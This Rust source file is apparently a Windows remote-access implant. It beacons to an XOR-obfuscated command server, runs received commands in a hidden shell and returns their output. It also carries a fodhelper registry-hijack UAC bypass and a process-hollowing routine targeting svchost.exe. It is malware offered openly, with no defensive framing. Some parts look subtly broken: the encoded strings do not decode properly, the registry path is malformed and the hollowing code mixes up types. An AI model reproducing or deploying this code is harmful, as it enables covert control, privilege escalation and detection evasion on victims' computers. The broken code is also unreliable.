use std::io::{Read, Write};
use std::net::{TcpStream};
use std::process::{Command, Stdio};
use std::os::windows::process::CommandExt;
use std::ptr;
use std::mem;

use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;
use windows_sys::Win32::Foundation::*;

const CREATE_NO_WINDOW: u32 = 0x08000000;

// --- OBFUSCATION MODULE ---
fn xor_cipher(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|&b| b ^ key).collect()
}

fn decrypt(encrypted: &[u8], key: u8) -> String {
    let decrypted = xor_cipher(encrypted, key);
    String::from_utf8_lossy(&decrypted).to_string()
}

// XORed strings (Key: 0xAA)
const ENC_CMD: &[u8] = &[0x09, 0x07, 0x04, 0x20, 0x2F, 0x43]; 
const ENC_IP: &[u8] = &[0x01, 0x20, 0x01, 0x20, 0x01, 0x20, 0x01, 0x20, 0x3a, 0x34, 0x34, 0x34, 0x34]; 
const KEY: u8 = 0xAA;

fn main() {
    let server_ip = decrypt(ENC_IP, KEY);
    loop {
        if let Ok(mut stream) = TcpStream::connect(&server_ip) {
            handle_client(&mut stream);
        }
        std::thread::sleep(std::time::Duration::from_secs(10));
    }
}

fn handle_client(stream: &mut TcpStream) {
    let mut buffer = [0; 4096];
    loop {
        match stream.read(&mut buffer) {
            Ok(0) => break,
            Ok(n) => {
                let command_str = String::from_utf8_lossy(&buffer[..n]).trim().to_string();
                if command_str == "exit" { break; }
                
                if command_str == "privesc" {
                    let res = uac_bypass();
                    let _ = stream.write_all(res.as_bytes());
                    continue;
                }
                
                if command_str == "camouflage" {
                    let res = process_hollowing("svchost.exe");
                    let _ = stream.write_all(res.as_bytes());
                    continue;
                }
                
                let output = execute_command(&command_str);
                if let Err(_) = stream.write_all(output.as_bytes()) { break; }
            }
            Err(_) => break,
        }
    }
}

fn uac_bypass() -> String {
    let exe_path = std::env::current_exe().unwrap();
    let reg_path = "HKCU\\Software\\Classes\\ms Folder\\shell\\open\\command";
    let cmd_reg = format!("reg add \"{}\" /ve /t REG_SZ /d \"{}\" /f", reg_path, exe_path.display());
    
    if Command::new("cmd").args(["/C", &cmd_reg]).output().is_ok() {
        let _ = Command::new("fodhelper.exe").spawn();
        "UAC Bypass initiated via fodhelper.exe...".to_string()
    } else {
        "Failed to configure UAC Bypass.".to_string()
    }
}

fn process_hollowing(target_process: &str) -> String {
    unsafe {
        let si = std::mem::zeroed::<PROCESS_INFORMATION>();
        let startup_info = std::mem::zeroed::<STARTUPINFO>();
        
        let h_process = CreateProcessA(
            ptr::null(), 
            target_process.as_ptr() as *const i8,
            ptr::null(), ptr::null(), 0, CREATE_SUSPENDED,
            ptr::null(), ptr::null(), &startup_info, &mut si,
        );
        
        if h_process == 0 { return "Error creating process.".to_string(); }
        
        let base_address = 0x400000;
        let payload = b"MZ\x90\x90\x90";
        
        let h_mem = VirtualAllocEx(
            si.hProcess, 
            base_address as *const _,
            payload.len(), 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        );
        
        if h_mem.is_null() { return "Error allocating memory.".to_string(); }
        
        let mut bytes_written = 0;
        WriteProcessMemory(si.hProcess, h_mem as *const _, payload.as_ptr() as *const _, payload.len(), &mut bytes_written);
        
        ResumeThread(si.hThread);
        format!("Camouflage completed in process {}", target_process)
    }
}

fn execute_command(cmd: &str) -> String {
    let shell = decrypt(ENC_CMD, KEY); 
    let parts: Vec<&str> = shell.split_whitespace().collect();
    let output = Command::new(parts[0])
        .args([parts[1], cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();
        
    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            if stdout.is_empty() { stderr } else { stdout }
        },
        Err(e) => format!("Error: {}", e),
    }
}
